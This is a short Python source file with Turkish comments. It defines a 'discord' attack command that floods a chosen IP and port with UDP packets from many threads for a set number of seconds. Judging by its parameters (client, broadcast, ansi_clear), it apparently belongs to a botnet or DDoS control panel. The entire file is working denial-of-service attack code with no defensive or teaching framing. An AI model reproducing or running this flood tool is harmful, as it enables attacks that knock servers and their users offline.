import socket
import time
import threading

def discord(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data):
    ip = args[1]  # Hedef IP
    port = int(args[2])  # Hedef Port
    secs = time.time() + int(args[3])  # Saldırı süresi
    threads = int(args[4]) if len(args) > 4 else 100  # Varsayılan olarak 100 thread
    payload = args[5].encode() if len(args) > 5 else b'\x13\x37\xca\xfe'  # Varsayılan payload

    # Hedef IP ve port'u doğrula
    if not validate_ip(ip):
        print("Geçersiz IP adresi.")
        return
    if not validate_port(port):
        print("Geçersiz port numarası.")
        return

    def udp_flood():
        while time.time() < secs:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (ip, port))
                s.close()
            except Exception as e:
                print(f"UDP Flood sırasında hata: {e}")

    # Thread'leri başlat
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=udp_flood)
        t.start()
        threads_list.append(t)

    # Thread'lerin tamamlanmasını bekle
    for t in threads_list:
        t.join()

    print(f"Discord UDP Flood saldırısı tamamlandı: {ip}:{port}")